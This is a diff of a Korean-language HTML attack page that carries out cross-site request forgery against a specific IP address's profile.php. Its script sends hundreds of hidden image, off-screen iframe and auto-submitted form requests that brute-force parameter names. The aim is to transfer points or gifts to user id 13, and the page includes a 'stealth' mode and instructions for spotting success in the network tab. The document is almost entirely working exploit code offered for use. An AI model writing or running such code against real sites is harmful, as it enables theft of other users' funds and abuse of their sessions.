@@ -2,137 +2,193 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>🎯 성공 패턴 분석</title>
+    <title>🎯 최종 돌파 작전</title>
     <style>
         body { 
             font-family: Arial; 
             padding: 20px;
-            background: linear-gradient(45deg, #00ff00, #0080ff);
+            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff);
             color: white;
+            animation: rainbow 3s infinite;
         }
-        .success-analysis {
+        @keyframes rainbow {
+            0% { background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); }
+            33% { background: linear-gradient(45deg, #00ff00, #0000ff, #ff0000); }
+            66% { background: linear-gradient(45deg, #0000ff, #ff0000, #00ff00); }
+            100% { background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); }
+        }
+        .final-push {
             background: rgba(0, 0, 0, 0.8);
-            border: 3px solid #00ff00;
+            border: 3px solid #ffff00;
             padding: 30px;
             margin: 20px 0;
             border-radius: 15px;
+            box-shadow: 0 0 30px #ffff00;
         }
         button {
-            background: #ff0000;
+            background: linear-gradient(45deg, #ff0000, #ffaa00);
             color: white;
             border: none;
-            padding: 15px 25px;
-            border-radius: 8px;
+            padding: 20px 30px;
+            border-radius: 10px;
             cursor: pointer;
             margin: 10px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
+            animation: pulse 2s infinite;
         }
-        .verify { background: #00aa00; }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
-    <div class="success-analysis">
-        <h1>🎯 BURST 공격 완료!</h1>
-        <h2>35개 조합 공격 성공적으로 실행됨!</h2>
+    <div class="final-push">
+        <h1>🎯 최종 돌파 작전!</h1>
+        <h2>⚡ 모든 패턴이 실행되었습니다!</h2>
         
-        <p><strong>📊 실행된 공격 패턴:</strong></p>
-        <ul>
-            <li>✅ BURST 1-7: <code>to=13, amount=1~100</code></li>
-            <li>✅ BURST 8-14: <code>user_id=13, coins=1~100</code></li>
-            <li>✅ BURST 15-21: <code>target=13, value=1~100</code></li>
-            <li>✅ BURST 22-28: <code>recipient=13, gift_points=1~100</code></li>
-            <li>✅ BURST 29-35: <code>receiver_id=13, points=1~100</code></li>
-        </ul>
+        <p><strong>🔍 네트워크 탭에서 성공 신호를 찾아야 합니다!</strong></p>
         
-        <button class="verify" onclick="analyzeSuccessfulRequests()">
-            🔍 성공한 요청 분석
-        </button>
-        
-        <button onclick="retrySuccessfulPattern()">
-            🎯 성공 패턴 재시도
-        </button>
-        
-        <button onclick="verificationAttack()">
-            ✅ 최종 검증 공격
-        </button>
+        <button onclick="megaBurstAttack()">💥 메가 버스트 공격</button>
+        <button onclick="stealthModeAttack()">🥷 스텔스 모드 공격</button>
+        <button onclick="bruteForceAllFields()">🔨 모든 필드 브루트포스</button>
     </div>
 
-    <div class="success-analysis">
-        <h2>🕵️‍♂️ 네트워크 탭에서 찾아야 할 것</h2>
-        <p><strong>성공 신호들:</strong></p>
-        <ol>
-            <li>🟢 <strong>Status: 200 OK</strong> - 완전한 성공!</li>
-            <li>🟡 <strong>Status: 302</strong> but <strong>Location ≠ login.php</strong></li>
-            <li>🔵 <strong>Content-Length > 0</strong> - 실제 응답 내용 있음</li>
-            <li>⚪ <strong>다른 응답 헤더들</strong> - Set-Cookie, Location 등</li>
-        </ol>
-        
-        <p><strong>💡 어떤 BURST 번호에서 다른 응답을 받았나요?</strong></p>
+    <div class="final-push">
+        <h2>🕵️‍♂️ 성공 여부 확인 방법</h2>
+        <p>네트워크 탭에서 다음을 찾으세요:</p>
+        <ul>
+            <li>🟢 <strong>Status: 200</strong> - 즉시 성공!</li>
+            <li>🟡 <strong>Status: 302</strong> + <strong>Location: profile.php</strong></li>
+            <li>🔵 <strong>Content-Length ≠ 0</strong></li>
+            <li>⚪ <strong>다른 응답 헤더들</strong></li>
+        </ul>
     </div>
 
     <div id="result"></div>
 
     <script>
-        function analyzeSuccessfulRequests() {
-            showResult('🔍 성공한 요청 패턴 분석 중...');
+        function megaBurstAttack() {
+            showResult('💥 메가 버스트 공격 개시!');
             
-            // 각 패턴별로 한 번씩 더 시도해서 일관성 확인
-            const patterns = [
-                {name: 'Pattern A', params: 'to=13&amount=50&send=1'},
-                {name: 'Pattern B', params: 'user_id=13&coins=50&transfer=1'},
-                {name: 'Pattern C', params: 'target=13&value=50&action=1'},
-                {name: 'Pattern D', params: 'recipient=13&gift_points=50&do_send=1'},
-                {name: 'Pattern E', params: 'receiver_id=13&points=50&send_gift=1'}
+            // 모든 가능한 조합으로 대규모 공격
+            const megaTargets = [];
+            
+            // 필드명 조합
+            const receivers = ['receiver_id', 'to', 'user_id', 'target', 'recipient', 'send_to', 'gift_to'];
+            const amounts = ['points', 'amount', 'coins', 'value', 'gift_points', 'money', 'credits'];
+            const actions = ['send_gift', 'send', 'transfer', 'action', 'do_send', 'submit', 'execute'];
+            
+            // 금액
+            const values = [1, 10, 50, 100, 999];
+            
+            let attackId = 0;
+            
+            receivers.forEach(recv => {
+                amounts.forEach(amt => {
+                    actions.forEach(act => {
+                        values.forEach(val => {
+                            attackId++;
+                            const params = `${recv}=13&${amt}=${val}&${act}=1&mega_id=${attackId}`;
+                            megaTargets.push(params);
+                        });
+                    });
+                });
+            });
+            
+            console.log(`💥 메가공격: ${megaTargets.length}개 조합 준비됨`);
+            
+            // 50개씩 나누어서 공격 (브라우저 부하 방지)
+            const batchSize = 50;
+            for(let i = 0; i < Math.min(megaTargets.length, 200); i += batchSize) {
+                setTimeout(() => {
+                    const batch = megaTargets.slice(i, i + batchSize);
+                    batch.forEach((params, batchIndex) => {
+                        setTimeout(() => {
+                            const img = new Image();
+                            img.src = `http://3.36.66.216/profile.php?${params}&t=${Date.now()}`;
+                            img.style.display = 'none';
+                            document.body.appendChild(img);
+                            
+                            if(batchIndex % 10 === 0) {
+                                console.log(`💥 MEGA ${i + batchIndex + 1}: ${params.split('&')[0]}`);
+                            }
+                        }, batchIndex * 20);
+                    });
+                }, (i / batchSize) * 2000);
+            }
+            
+            showResult('💥 메가 버스트 공격 진행 중!\n최대 200개 조합으로 전면 공격 실시!');
+        }
+        
+        function stealthModeAttack() {
+            showResult('🥷 스텔스 모드 공격...');
+            
+            // 매우 은밀하게, 천천히 공격
+            const stealthTargets = [
+                'gift_to=13&points=1',
+                'send_to=13&amount=1', 
+                'transfer_to=13&coins=1',
+                'donate_to=13&money=1',
+                'give_to=13&credits=1'
             ];
             
-            patterns.forEach((pattern, i) => {
+            stealthTargets.forEach((params, i) => {
                 setTimeout(() => {
-                    const url = `http://3.36.66.216/profile.php?${pattern.params}&verify=${Date.now()}`;
+                    // 여러 방법으로 동시에
                     
-                    // 응답 시간과 크기 측정
-                    const start = Date.now();
+                    // 1. 매우 작은 이미지
                     const img = new Image();
+                    img.src = `http://3.36.66.216/profile.php?${params}&stealth=true&t=${Date.now()}`;
+                    img.width = 1;
+                    img.height = 1;
+                    img.style.position = 'absolute';
+                    img.style.left = '-1000px';
+                    document.body.appendChild(img);
                     
-                    img.onload = () => {
-                        const responseTime = Date.now() - start;
-                        console.log(`✅ ${pattern.name} 성공! 응답시간: ${responseTime}ms`);
-                    };
+                    // 2. 숨겨진 iframe
+                    const iframe = document.createElement('iframe');
+                    iframe.src = `http://3.36.66.216/profile.php?${params}&iframe=true`;
+                    iframe.width = 1;
+                    iframe.height = 1;
+                    iframe.style.position = 'absolute';
+                    iframe.style.left = '-1000px';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
                     
-                    img.onerror = () => {
-                        const responseTime = Date.now() - start;
-                        console.log(`⚠️ ${pattern.name} 에러 (${responseTime}ms)`);
-                    };
-                    
-                    img.src = url;
-                    console.log(`🔍 ${pattern.name} 검증: ${pattern.params}`);
-                }, i * 1000);
+                    console.log(`🥷 스텔스 ${i+1}: ${params}`);
+                }, i * 3000);
             });
         }
         
-        function retrySuccessfulPattern() {
-            showResult('🎯 가장 유망한 패턴으로 재공격...');
+        function bruteForceAllFields() {
+            showResult('🔨 모든 필드 브루트포스...');
             
-            // 가장 성공 가능성이 높은 조합들로 집중 공격
-            const bestTargets = [
-                'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=SUCCESS_TEST',
-                'to=13&amount=100&send=1&type=gift&msg=SUCCESS_TEST',
-                'user_id=13&coins=100&transfer=1&operation=send&note=SUCCESS_TEST'
+            // 일반적인 웹 애플리케이션 필드명들 시도
+            const commonFields = [
+                'id', 'user', 'userid', 'user_id', 'uid', 'to', 'target', 'dest', 'destination',
+                'receiver', 'receiver_id', 'recipient', 'send_to', 'gift_to', 'transfer_to',
+                'amount', 'value', 'sum', 'total', 'points', 'coins', 'money', 'credits',
+                'cash', 'balance', 'fund', 'gift_amount', 'transfer_amount', 'send_amount',
+                'action', 'submit', 'send', 'transfer', 'give', 'donate', 'gift', 'execute',
+                'do', 'perform', 'run', 'process', 'confirm', 'ok', 'yes', 'true', '1'
             ];
             
-            bestTargets.forEach((params, i) => {
+            // 모든 조합 시도
+            for(let i = 0; i < commonFields.length; i += 3) {
                 setTimeout(() => {
-                    // 다중 방법으로 동시 시도
+                    const recv = commonFields[i % 10]; // receiver 필드
+                    const amt = commonFields[10 + (i % 10)]; // amount 필드  
+                    const act = commonFields[20 + (i % 10)]; // action 필드
                     
-                    // 1. Image 태그
-                    const img = new Image();
-                    img.src = `http://3.36.66.216/profile.php?${params}&method=img&retry=${i}`;
+                    const params = `${recv}=13&${amt}=50&${act}=1&brute=${i}`;
                     
-                    // 2. 숨겨진 GET Form
                     const form = document.createElement('form');
                     form.method = 'GET';
                     form.action = 'http://3.36.66.216/profile.php';
-                    form.target = `verify_${i}`;
+                    form.target = `brute_${i}`;
                     form.style.display = 'none';
                     
                     params.split('&').forEach(param => {
@@ -143,64 +199,27 @@
                         form.appendChild(input);
                     });
                     
-                    // 추가 검증 필드
-                    const verifyInput = document.createElement('input');
-                    verifyInput.name = 'final_test';
-                    verifyInput.value = 'true';
-                    form.appendChild(verifyInput);
-                    
                     document.body.appendChild(form);
                     
-                    // iframe
                     const iframe = document.createElement('iframe');
-                    iframe.name = `verify_${i}`;
+                    iframe.name = `brute_${i}`;
                     iframe.style.display = 'none';
-                    iframe.style.width = '500px';
-                    iframe.style.height = '300px';
                     document.body.appendChild(iframe);
                     
                     form.submit();
                     
-                    console.log(`🎯 최종시도 ${i+1}: ${params.split('&')[0]} (이미지+폼 동시)`);
-                }, i * 2000);
-            });
-        }
-        
-        function verificationAttack() {
-            showResult('✅ 최종 검증 공격 실행...');
-            
-            // 만약 성공했다면 더 큰 금액으로 확인
-            const verificationAmounts = [200, 500, 1000];
-            
-            verificationAmounts.forEach((amount, i) => {
-                setTimeout(() => {
-                    const testUrl = `http://3.36.66.216/profile.php?receiver_id=13&points=${amount}&send_gift=1&gift_type=diamond&message=VERIFICATION_${amount}&timestamp=${Date.now()}`;
-                    
-                    window.open(testUrl, `verification_${i}`, 'width=600,height=400');
-                    
-                    console.log(`✅ 검증공격 ${i+1}: ${amount}P 시도`);
-                }, i * 3000);
-            });
-            
-            showResult(`✅ 최종 검증 공격 진행 중...
-            
-3단계 검증:
-- 1단계: 200P 시도
-- 2단계: 500P 시도  
-- 3단계: 1000P 시도
-
-각각 새 창에서 열려 결과 확인 가능
-성공하면 새로운 페이지나 메시지가 표시될 것입니다!`);
+                    console.log(`🔨 브루트 ${i+1}: ${recv}=13, ${amt}=50, ${act}=1`);
+                }, i * 100);
+            }
         }
         
         function showResult(text) {
             document.getElementById('result').innerHTML = 
-                '<div class="success-analysis"><pre style="color: #ffff00;">' + text + '</pre></div>';
+                '<div class="final-push"><pre style="color: #ffff00; font-size: 16px;">' + text + '</pre></div>';
         }
         
-        console.log('🎯 BURST 공격 완료!');
-        console.log('🔍 네트워크 탭에서 성공한 요청 찾기 중...');
-        console.log('💡 200 OK나 다른 응답을 받은 BURST가 있다면 성공!');
+        console.log('🎯 최종 돌파 작전 준비됨!');
+        console.log('💥 네트워크 탭에서 성공 신호를 찾으세요!');
     </script>
 </body>
 </html>
